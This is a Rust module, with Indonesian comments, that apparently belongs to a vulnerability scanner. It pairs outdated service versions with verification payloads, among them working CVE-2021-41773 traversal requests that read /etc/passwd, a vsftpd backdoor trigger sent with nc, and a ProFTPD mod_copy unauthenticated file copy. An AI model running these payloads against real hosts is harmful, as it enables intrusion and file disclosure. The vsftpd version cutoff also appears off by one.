//! Vulnerability Database Module

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerabilityRule {
    pub service: String,
    pub max_safe_version: (u32, u32, u32), // Version di bawah ini dianggap rentan (exclusive)
    pub name: String,
    pub description: String,
    pub severity: String,
    pub confidence: u8,
    pub impact: String,
    pub recommendation: String,
    pub payload_type: String,
    pub payload: String,
    pub steps: String,
    pub expected_result: String,
    pub risk_confirmed_if: String,
}

pub fn get_rules() -> Vec<VulnerabilityRule> {
    // Sebagai fallback apabila file rules.json tidak dapat diload.
    vec![
        VulnerabilityRule {
            service: "openssh".to_string(),
            max_safe_version: (7, 4, 0),
            name: "Outdated SSH version".to_string(),
            description: "Versi OpenSSH sangat lawas dan rentan terhadap berbagai eksploit.".to_string(),
            severity: "High".to_string(),
            confidence: 90,
            impact: "Memungkinkan penyerang melakukan bypass autentikasi atau denial-of-service.".to_string(),
            recommendation: "Lakukan upgrade daemon OpenSSH ke versi minim >= 7.4.".to_string(),
            payload_type: "Nmap NSE Scripting".to_string(),
            payload: "nmap -p 22 -sV --script ssh2-enum-algos <TARGET_IP>".to_string(),
            steps: "Lakukan enumerasi algoritma kunci yang didukung oleh server SSH target.".to_string(),
            expected_result: "Menemukan algoritma usang/lemah seperti 'ssh-rsa', 'diffie-hellman-group1-sha1', atau 'arcfour'.".to_string(),
            risk_confirmed_if: "Banner mencantumkan versi < 7.4.".to_string(),
        },
        VulnerabilityRule {
            service: "nginx".to_string(),
            max_safe_version: (1, 16, 0),
            name: "Outdated NGINX Server".to_string(),
            description: "Web server nginx berada pada major version usang.".to_string(),
            severity: "Medium".to_string(),
            confidence: 85,
            impact: "Rentan terhadap HTTP Request Smuggling atau Buffer Overflow.".to_string(),
            recommendation: "Lakukan update nginx minimal ke stable release 1.16 atau mainline terbaru.".to_string(),
            payload_type: "HTTP Request".to_string(),
            payload: "curl -I -s http://<TARGET_IP>/".to_string(),
            steps: "Kirim HTTP HEAD request dan inspeksi header `Server:`".to_string(),
            expected_result: "Menerima balasan dengan header `Server: nginx/1.14.0` atau di bawahnya.".to_string(),
            risk_confirmed_if: "Versi nginx pada header Server kurang dari 1.16.x.".to_string(),
        },
        VulnerabilityRule {
            service: "apache".to_string(),
            max_safe_version: (2, 4, 49),
            name: "Vulnerable Apache HTTP Server".to_string(),
            description: "Server Apache HTTP (<2.4.49) terindikasi rentan.".to_string(),
            severity: "Critical".to_string(),
            confidence: 95,
            impact: "Memungkinkan serangan Path Traversal (CVE-2021-41773) untuk membaca file internal server.".to_string(),
            recommendation: "Segera patch dan upgrade Apache HTTP Server minimal ke versi 2.4.51+.".to_string(),
            payload_type: "HTTP Request (Double URL Encoding)".to_string(),
            payload: "curl -s -v --path-as-is \"http://<TARGET_IP>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd\"".to_string(),
            steps: "Kirim payload traversal dengan double URL encoding. Ini menguji bypass dari filter direktori standar.".to_string(),
            expected_result: "Mendapatkan isi file /etc/passwd (root:x:0:0...).".to_string(),
            risk_confirmed_if: "Server mengembalikan response isi file /etc/passwd.".to_string(),
        },
        VulnerabilityRule {
            service: "httpd".to_string(),
            max_safe_version: (2, 4, 49),
            name: "Vulnerable Apache HTTP Server".to_string(),
            description: "Server Apache HTTP (<2.4.49) terindikasi rentan.".to_string(),
            severity: "Critical".to_string(),
            confidence: 95,
            impact: "Memungkinkan serangan Path Traversal (CVE-2021-41773) untuk membaca file internal server.".to_string(),
            recommendation: "Segera patch dan upgrade Apache HTTP Server minimal ke versi 2.4.51+.".to_string(),
            payload_type: "HTTP Request".to_string(),
            payload: "curl -v --path-as-is http://<TARGET_IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd".to_string(),
            steps: "Kirim payload traversal untuk memvalidasi CVE-2021-41773 secara tidak merusak (membaca file lokal saja)".to_string(),
            expected_result: "Mendapatkan isi file passwd.".to_string(),
            risk_confirmed_if: "Server mengembalikan response isi file /etc/passwd.".to_string(),
        },
        VulnerabilityRule {
            service: "vsftpd".to_string(),
            max_safe_version: (2, 3, 4),
            name: "vsftpd Backdoor Vulnerability".to_string(),
            description: "vsftpd 2.3.4 memiliki backdoor yang tereksploitasi luas.".to_string(),
            severity: "Critical".to_string(),
            confidence: 99,
            impact: "Hacker dapat memicu eksekusi shell otomatis sebagai root pada port 6200 hanya dengan memasukkan username tertentu.".to_string(),
            recommendation: "Upgrade vsftpd ke versi modern (> 3.0.x) atau gunakan server SFTP alternatif.".to_string(),
            payload_type: "Automated TCP Socket (Ncat)".to_string(),
            payload: "echo -e \"USER hacker:)\\nPASS pass\\n\" | nc -w 3 <TARGET_IP> 21 && nc -vz <TARGET_IP> 6200".to_string(),
            steps: "Kirim trigger senyum ':)' ke port 21 secara non-interaktif, lalu segera periksa apakah port TCP 6200 (bind shell) terbuka.".to_string(),
            expected_result: "Koneksi ke port 6200 berhasil terbentuk (Connection Refused berubah menjadi Succeeded).".to_string(),
            risk_confirmed_if: "Port 6200 terbuka sesaat setelah mencoba login payload smiley.".to_string(),
        },
        VulnerabilityRule {
            service: "proftpd".to_string(),
            max_safe_version: (1, 3, 5),
            name: "Outdated ProFTPD Mod_Copy".to_string(),
            description: "ProFTPD 1.3.5 memiliki modul mod_copy yang rentan.".to_string(),
            severity: "High".to_string(),
            confidence: 90,
            impact: "Penyerang tanpa otentikasi dapat melakukan copy-paste file secara acak dan mengeksekusi file PHP backdoor jika DocumentRoot terekspos.".to_string(),
            recommendation: "Matikan modul mod_copy atau upgrade ProFTPD ke versi minimal 1.3.5b.".to_string(),
            payload_type: "FTP Custom Command (cURL)".to_string(),
            payload: "curl -s \"ftp://<TARGET_IP>:21\" -Q \"SITE CPFR /etc/passwd\" -Q \"SITE CPTO /tmp/proof_of_concept\"".to_string(),
            steps: "Gunakan cURL untuk menginjeksi pre-quote FTP commands tanpa perlu otentikasi. Membaca respon FTP server.".to_string(),
            expected_result: "Server merespon dengan '350 File or directory exists' pada command CPFR, diikuti '250 Copy successful' pada CPTO.".to_string(),
            risk_confirmed_if: "Menerima Response kode HTTP 350 menandakan file bisa di-copy tanpa login.".to_string(),
        },
    ]
}

use regex::Regex;

/// Parse versi dari text berdasarkan keyword service
/// Contoh: "Server: nginx/1.14.0" dengan keyword "nginx" -> (1, 14, 0)
fn parse_version(keyword: &str, text: &str) -> Option<(u32, u32, u32)> {
    let lower_text = text.to_lowercase();
    let lower_kw = keyword.to_lowercase();
    
    // Cari keyword diikuti oleh karakter non-digit opsional, lalu ekstrak angka (major.minor.patch)
    let pattern = format!(r"{}[^\d]*(\d+)\.(\d+)(?:\.(\d+))?", regex::escape(&lower_kw));
    let re = Regex::new(&pattern).ok()?;
    
    if let Some(captures) = re.captures(&lower_text) {
        let major = captures.get(1)?.as_str().parse::<u32>().unwrap_or(0);
        let minor = captures.get(2)?.as_str().parse::<u32>().unwrap_or(0);
        let patch = captures.get(3).map_or(0, |m| m.as_str().parse::<u32>().unwrap_or(0));
        return Some((major, minor, patch));
    }
    
    None
}

pub fn check_vulnerability(service: &str, version: Option<&str>) -> Vec<crate::utils::report::Vulnerability> {
    let mut vulnerabilities = Vec::new();
    let text = match version {
        Some(v) => v,
        None => return vulnerabilities,
    };

    let rules = get_rules();
    let service_lower = service.to_lowercase();
    let text_lower = text.to_lowercase();

    for rule in rules {
        // Cocokkan apakah rule berlaku untuk service yang discan
        if service_lower.contains(&rule.service) || text_lower.contains(&rule.service) {
            
            // Coba parse versinya
            if let Some(parsed_ver) = parse_version(&rule.service, text) {
                // Return tuple comparison checking (major, minor, patch)
                if parsed_ver < rule.max_safe_version {
                    vulnerabilities.push(crate::utils::report::Vulnerability {
                        name: format!("{} (Detected {}.{}.{})", rule.name, parsed_ver.0, parsed_ver.1, parsed_ver.2),
                        description: rule.description.clone(),
                        severity: rule.severity.clone(),
                        confidence: rule.confidence,
                        impact: rule.impact.clone(),
                        recommendation: rule.recommendation.clone(),
                        verification: crate::utils::report::VerificationPayload {
                            verification_type: rule.payload_type.clone(),
                            payload: rule.payload.clone(),
                            steps: rule.steps.clone(),
                            expected_result: rule.expected_result.clone(),
                            risk_confirmed_if: rule.risk_confirmed_if.clone(),
                        }
                    });
                }
            }
        }
    }

    vulnerabilities
}